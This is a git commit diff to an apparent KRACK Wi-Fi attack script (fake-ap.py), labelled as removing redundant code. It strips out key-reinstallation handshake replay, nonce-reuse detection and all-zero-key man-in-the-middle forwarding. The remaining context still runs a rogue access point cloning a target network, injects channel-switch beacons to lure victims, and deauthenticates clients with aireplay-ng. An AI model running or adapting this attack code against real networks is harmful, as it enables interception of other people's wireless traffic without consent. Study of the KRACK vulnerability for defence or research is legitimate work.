ed467411786a7744cc87b9d7a98c2dbb7b94cbea
611410066 <10sun19991119@gmail.com>
2023-06-19 16:28:01 +0800

    fix: remove 多餘的code

--- krackattack/fake-ap.py
+++ krackattack/fake-ap.py
@@ -220,18 +220,6 @@ class KRAckAttack():
 		self.group1 = []
 		self.time_forward_group1 = None
 
-	def hostapd_rx_mgmt(self, p):
-		log(DEBUG, "Sent frame to hostapd: %s" % dot11_to_str(p))
-		self.hostapd_ctrl.request("RX_MGMT " + str(p[Dot11]).encode("hex"))
-
-	def hostapd_add_sta(self, macaddr):
-		log(DEBUG, "Forwarding auth to rouge AP to register client", showtime=False)
-		self.hostapd_rx_mgmt(Dot11(addr1=self.apmac, addr2=macaddr, addr3=self.apmac)/Dot11Auth(seqnum=1))
-
-	def hostapd_finish_4way(self, stamac):
-		log(DEBUG, "Sent frame to hostapd: finishing 4-way handshake of %s" % stamac)
-		self.hostapd_ctrl.request("FINISH_4WAY %s" % stamac)
-
 	def find_beacon(self, ssid):
 		ps = sniff(count=100, timeout=30, lfilter=lambda p: p.haslayer(Dot11Beacon) and get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid, iface=self.nic_real_mon)
 		if ps is None or len(ps) < 1:
@@ -277,120 +265,6 @@ class KRAckAttack():
 		self.send_csa_beacon()
 		self.queue_disas(macaddr)
 
-	def hostapd_add_allzero_client(self, client):
-		if client.assocreq is None:
-			log(ERROR, "Didn't receive AssocReq of client %s, unable to let rogue hostapd handle client." % client.macaddr)
-			return False
-		# 1. Add the client to hostapd
-		self.hostapd_add_sta(client.macaddr)
-		# 2. Inform hostapd of the encryption algorithm and options the client uses
-		self.hostapd_rx_mgmt(client.assocreq)
-		# 3. Send the EAPOL msg4 to trigger installation of all-zero key by the modified hostapd
-		self.hostapd_finish_4way(client.macaddr)
-		return True
-
-	def handle_to_client_pairwise(self, client, p):
-		if args.group: return False
-
-		eapolnum = get_eapol_msgnum(p)
-		if eapolnum == 1 and client.state in [ClientState.Connecting, ClientState.GotMitm]:
-			log(DEBUG, "Storing msg1")
-			client.store_msg1(p)
-		elif eapolnum == 3 and client.state in [ClientState.Connecting, ClientState.GotMitm]:
-
-			client.add_if_new_msg3(p)
-			if len(client.msg3s) >= 2:
-				log(STATUS, "Got 2nd unique EAPOL msg3. Will forward both these Msg3's seperated by a forged msg1.", color="green", showtime=False)
-				log(STATUS, "==> Performing key reinstallation attack!", color="green", showtime=False)
-				packet_list = client.msg3s
-				# 插入一個 msg 假裝是正常的流程 (但是實測沒有作用，會導致不回應 msg4 失敗)
-				# p = set_eapol_replaynum(client.msg1, get_eapol_replaynum(packet_list[0]) + 1)
-				# packet_list.insert(1, p)
-				for p in packet_list: self.sock_rogue.send(p, True, self.netconfig.rogue_channel)
-				client.msg3s = []
-				client.attack_start()
-			else:
-				log(STATUS, "Not forwarding EAPOL msg3 (%d unique now queued)" % len(client.msg3s), color="green", showtime=False)
-
-			return True
-
-		return False
-
-	def handle_from_client_pairwise(self, client, p):
-		if args.group: return
-
-		if p.haslayer(Dot11WEP) or p.haslayer(Dot11CCMP):
-			if p.haslayer(Dot11WEP):
-				plaintext = "\xaa\xaa\x03\x00\x00\x00"
-				# Note that scapy incorrectly puts Extended IV into wepdata field, so skip those four bytes
-				encrypted = p[Dot11WEP].wepdata[4:4+len(plaintext)]
-				keystream = xorstr(plaintext, encrypted)
-			else:
-				try:
-
-					plaintext = b"\xaa\xaa\x03\x00\x00\x00"
-					encrypted = p[Dot11CCMP].data[:len(plaintext)]
-					print('encrypted= ', end='')
-					print(encrypted)
-					tmp = []
-					for i in range(len(plaintext)):
-						tmp.append(plaintext[i]^encrypted[i])
-					keystream = bytes(tmp)
-					print(keystream)
-				except:
-					print('exit !')
-					return
-
-			iv = dot11_get_iv(p)
-			# if iv <= 1: log(STATUS, "Ciphertext: " + encrypted.decode(), showtime=False)
-
-			if client.is_iv_reused(iv):
-				# If the same keystream is reused, we have a normal key reinstallation attack
-				if keystream == client.get_keystream(iv):
-					log(STATUS, "SUCCESS! Nonce and keystream reuse detected (IV=%d)." % iv, color="green", showtime=False)
-					client.update_state(ClientState.Success_Reinstalled)
-					self.sock_real.send(client.msg4, True, self.netconfig.real_channel)
-
-				# Otherwise the client likely installed a new key, i.e., probably an all-zero key
-				else:
-					log(STATUS, "SUCCESS! Nonce reuse detected (IV=%d), with usage of all-zero encryption key." % iv, color="green", showtime=False)
-					log(STATUS, "Now MitM'ing the victim using our malicious AP, and interceptig its traffic.", color="green", showtime=False)
-
-					self.hostapd_add_allzero_client(client)
-
-					# The client is now no longer MitM'ed by this script (i.e. no frames forwarded between channels)
-					client.update_state(ClientState.Success_AllzeroKey)
-
-			elif client.attack_timeout(iv):
-				log(WARNING, "KRAck Attack against %s seems to have failed" % client.macaddr)
-				client.update_state(ClientState.Failed)
-
-			client.save_iv_keystream(iv, keystream)
-
-	def handle_to_client_groupkey(self, client, p):
-		if not args.group: return False
-
-		# Does this look like a group key handshake frame -- FIXME do not hardcode the TID
-		if p.haslayer(Dot11WEP) and p.addr2 == self.apmac and p.addr3 == self.apmac and dot11_get_tid(p) == 7:
-			# TODO: Detect that it's not a retransmission
-			self.group1.append(p)
-			log(STATUS, "Queued %s group message 1's" % len(self.group1), showtime=False)
-			if len(self.group1) == 2:
-				log(STATUS, "Forwarding first group1 message", showtime=False)
-				self.sock_rogue.send(self.group1.pop(0), True, self.netconfig.rogue_channel)
-
-				self.time_forward_group1 = time.time() + 3
-
-			return True
-		return False
-
-	def handle_from_client_groupkey(self, client, p):
-		if not args.group: return
-	
-		# Does this look like a group key handshake frame -- FIXME do not hardcode the TID
-		if p.haslayer(Dot11WEP) and p.addr1 == self.apmac and p.addr3 == self.apmac and dot11_get_tid(p) == 7:
-			log(STATUS, "Got a likely group message 2", showtime=False)
-
 	def handle_rx_realchan(self):
 		p, origin_p = self.sock_real.recv()
 		if p == None: 
@@ -429,115 +303,14 @@ class KRAckAttack():
 			# Prevent the AP from thinking clients that are connecting are sleeping, until attack completed or failed
 			if p.FCfield & 0x10 != 0 and p.addr2 in self.clients and self.clients[p.addr2].state <= ClientState.Attack_Started:
 				log(WARNING, "Injecting Null frame so AP thinks client %s is awake (attacking sleeping clients is not fully supported)" % p.addr2)
-				self.sock_real.send(Dot11(type=2, subtype=4, addr1=self.apmac, addr2=self.clientmac, addr3=self.apmac), True, self.netconfig.real_channel)
-
-		# 2. 處理來自原本 AP 的 frames
-		elif p.addr2 == self.apmac:
-			# Track time of last beacon we received. Verify channel to assure it's not the rogue AP.
-			if p.haslayer(Dot11Beacon) and ord(get_tlv_value(p, IEEE_TLV_TYPE_CHANNEL)) == self.netconfig.real_channel:
-				self.last_real_beacon = time.time()
-
-			# 決定要不要轉送封包
-			might_forward = p.addr1 in self.clients and self.clients[p.addr1].should_forward(p, args.group)
-			might_forward = might_forward or (args.group and dot11_is_group(p) and p.haslayer(Dot11WEP))
-
-			if might_forward:
-				if p.addr1 in self.clients:
-					client = self.clients[p.addr1]
-					if self.handle_to_client_pairwise(client, p):
-						print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing pass forward !!")
-						pass
-					elif self.handle_to_client_groupkey(client, p):
-						print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing pass forward !!")
-						pass
-					elif p.haslayer(Dot11Deauth):
-						del self.clients[p.addr1]
-						print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing")
-						self.sock_rogue.send(p, True, self.netconfig.rogue_channel)
-					else:
-						print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing")
-						self.sock_rogue.send(p, True, self.netconfig.rogue_channel)
-				# Group addressed frames
-				else:
-					print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing")
-					self.sock_rogue.send(p, True, self.netconfig.rogue_channel)
-
-		# 3. Always display all frames sent by or to the targeted client
-		elif p.addr1 == self.clientmac or p.addr2 == self.clientmac:
-			print_rx(INFO, "Real channel ", p, suffix=" --no forward !!")
 
 	def handle_rx_roguechan(self):
 		p, origin_p = self.sock_rogue.recv()
 		if p == None: return
-
-		# 1. 處理來自原本 AP 的 frames
-		if p.addr2 == self.apmac:
-			# Track time of last beacon we received. Verify channel to assure it's not the real AP.
-			if p.haslayer(Dot11Beacon) and ord(get_tlv_value(p, IEEE_TLV_TYPE_CHANNEL)) == self.netconfig.rogue_channel:
-				self.last_rogue_beacon = time.time()
-			# Display all frames sent to the targeted client
-			if self.clientmac is not None and p.addr1 == self.clientmac:
-				print_rx(INFO, "Rogue channel", p, suffix=" -- receive")
-
-		# 2. 處理送往原本 AP 的 frames
-		elif p.addr1 == self.apmac:
-			client = None
-			# 檢查是不是新的client端，that we can MitM
-			if p.haslayer(Dot11Auth):
-				print_rx(INFO, "Rogue channel", p, suffix=" -- MitM'ing")
-				self.clients[p.addr2] = ClientState(p.addr2)
-				self.clients[p.addr2].mark_got_mitm()
-				client = self.clients[p.addr2]
-				will_forward = True
-			elif p.haslayer(Dot11AssoReq):
-				print_rx(INFO, "Rogue channel", p, suffix=" -- MitM'ing")
-				client = self.clients[p.addr2]
-				will_forward = True
-			# Always display all frames sent by the targeted client
-			elif p.addr2 == self.clientmac:
-				if p.addr2 in self.clients:
-					client = self.clients[p.addr2]
-					will_forward = client.should_forward(p, args.group)
-				else: 
-					will_forward = False
-				if (will_forward):
-					print_rx(INFO, "Rogue channel", p, suffix=" -- MitM'ing")
-				else:
-					print_rx(INFO, "Rogue channel", p, suffix=" -- no forward")
-			# 否則，確認是否是正在追蹤的client端，that we are tracking/MitM'ing
-			elif p.addr2 in self.clients:
-				client = self.clients[p.addr2]
-				will_forward = client.should_forward(p, args.group)
-				if (will_forward):
-					print_rx(INFO, "Rogue channel", p, suffix=" -- MitM'ing")
-				else:
-					print_rx(INFO, "Rogue channel", p, suffix=" -- no forward")
-
-			# If this now belongs to a client we want to track, process the packet further
-			if client is not None:
-				# Save the association request so we can track the encryption algorithm and options the client uses
-				if p.haslayer(Dot11AssoReq): client.assocreq = p
-				# Save msg4 so we can complete the handshake once we attempted a key reinstallation attack
-				if get_eapol_msgnum(p) == 4: client.msg4 = p
-
-				# Client is sending on rogue channel, we got a MitM position =)
-				client.mark_got_mitm()
-
-				if p.haslayer(Dot11WEP) or p.haslayer(Dot11CCMP):
-					# Use encrypted frames to determine if the key reinstallation attack succeeded
-					# 檢查 KRACK攻擊有沒有成功，
-					self.handle_from_client_pairwise(client, p)
-					self.handle_from_client_groupkey(client, p)
-
-				if will_forward:
-					# Don't mark client as sleeping when we haven't got two Msg3's and performed the attack
-					if client.state < ClientState.Attack_Started:
-						p.FCfield &= 0xFFEF
-					self.sock_real.send(p, True, self.netconfig.real_channel)
-
-		# 3. Always display all frames sent by or to the targeted client
-		elif p.addr1 == self.clientmac or p.addr2 == self.clientmac:
-			print_rx(INFO, "Rogue channel", p, suffix=" -- no forward")
+		
+		# Always display all frames sent by or to the targeted client
+		if p.addr1 == self.clientmac or p.addr2 == self.clientmac:
+			print_rx(INFO, "Rogue channel", p, suffix="")
 
 	def handle_hostapd_out(self):
 		# hostapd always prints lines so this should not block
@@ -547,25 +320,19 @@ class KRAckAttack():
 			quit(1)
 
 		if line.startswith(">>>> ".encode()):
-			log(STATUS, "Rogue hostapd: " + line[5:].strip().decode())
+			log(DEBUG, "Rogue hostapd: " + line[5:].strip().decode())
 		elif line.startswith(">>> ".encode()):
 			log(DEBUG, "Rogue hostapd: " + line[4:].strip().decode())
 		# This is a bit hacky but very usefull for quick debugging
 		elif "fc=0xc0".encode() in line:
-			log(WARNING, "Rogue hostapd: " + line.strip().decode())
+			log(DEBUG, "Rogue hostapd: " + line.strip().decode())
 		elif "sta_remove".encode() in line or "Add STA".encode() in line or "disassoc cb".encode() in line or "disassocation: STA".encode() in line:
 			log(DEBUG, "Rogue hostapd: " + line.strip().decode())
 		else:
-			log(ALL, "Rogue hostapd: " + line.strip().decode())
+			log(DEBUG, "Rogue hostapd: " + line.strip().decode())
 		self.hostapd_log.write(datetime.now().strftime('[%H:%M:%S] ') + line.decode())
 
 	def configure_interfaces(self):
-		# 0. Warn about common mistakes
-		log(STATUS, "Note: remember to disable Wi-Fi in your network manager so it doesn't interfere with this script")
-		# This happens when targetting a specific client: both interfaces will ACK frames from each other due to the capture
-		# effect, meaning certain frames will not reach the rogue AP or the client. As a result, the client will disconnect.
-		log(STATUS, "Note: keep >1 meter between both interfaces. Else packet delivery is unreliable & target may disconnect")
-
 		# 1. Configure monitor mode on interfaces
 		subprocess.check_output(["ifconfig", self.nic_real_mon, "down"])
 		subprocess.check_output(["iwconfig", self.nic_real_mon, "mode", "monitor"])
@@ -627,35 +394,19 @@ class KRAckAttack():
 		# Set up a rogue AP that clones the target network (don't use tempfile - it can be useful to manually use the generated config)
 		with open(os.path.realpath(os.path.join(self.script_path, "../hostapd/hostapd_fakeap.conf")), "w") as fp:
 			fp.write(self.netconfig.write_config(self.nic_rogue_ap))
-		# hostapd_path = os.path.realpath((os.path.join(self.script_path, "../hostapd/hostapd")) + ' ' + os.path.realpath(os.path.join(self.script_path, "hostapd_rogue.conf")) + " -dd" + " -K")
-		# /home/sun10/krackattacks-poc-zerokey/hostapd/hostapd
 		self.hostapd = subprocess.Popen("hostapd /home/sun10/krackattacks-poc-zerokey/hostapd/hostapd_fakeap.conf -dd -K", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
 		self.hostapd_log = open("hostapd_fakeap.log", "w")
 		
 		log(STATUS, "Giving the rogue hostapd one second to initialize ...")
 		time.sleep(10)
 
-		# when domain name (encode) to idna, label empty or too long error, 
-		# that is because domain name uses "." to split label,
-		# every label limited to longest 63 characters or no empty.
-		# self.hostapd_ctrl = Ctrl(os.path.realpath(os.path.join(self.script_path, "../hostapd/hostapd_ctrl"))+ '/' + self.nic_rogue_ap) # "hostapd_ctrl/"
-		# self.hostapd_ctrl.attach()
-
 		# Inject some CSA beacons to push victims to our channel
 		self.send_csa_beacon(numbeacons=4)
 		subprocess.check_output(["iw", self.nic_real_clientack, "set", "channel", str(self.netconfig.real_channel)])
 
 		# deauthenticated 所有 client端，讓 AP 端重新四次交握
-		dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=self.apmac, addr3=self.apmac)
-		deauth = dot11/Dot11Deauth(reason=3)
-		self.sock_real.send(deauth, True, self.netconfig.real_channel)
 		subprocess.call(["aireplay-ng", "-0", "10", "-a", self.apmac, "-c", self.clientmac, self.nic_real_mon])
-
-		# For good measure, also queue a dissasociation to the targeted client on the rogue channel
-		if self.clientmac:
-			self.queue_disas(self.clientmac)	
-		subprocess.check_output(["iw", self.nic_real_clientack, "set", "channel", str(self.netconfig.real_channel)])
-		
+	
 		# Continue attack by monitoring both channels and performing needed actions
 		self.last_real_beacon = time.time()
 		self.last_rogue_beacon = time.time()
@@ -711,8 +462,7 @@ def cleanup():
 	attack.stop()
 
 if __name__ == "__main__":
-	description = textwrap.dedent("""Uses CSA beacons to obtain channel-based MitM position""")
-	parser = argparse.ArgumentParser(description=description, formatter_class=argparse.RawDescriptionHelpFormatter)
+	parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter)
 	# 必要的參數
 	parser.add_argument("nic_real_mon", help="Wireless monitor interface that will listen on the channel of the target AP.")
 	parser.add_argument("nic_real_clientack", help="Wireless monitor interface that will station on the channel of the target AP.")
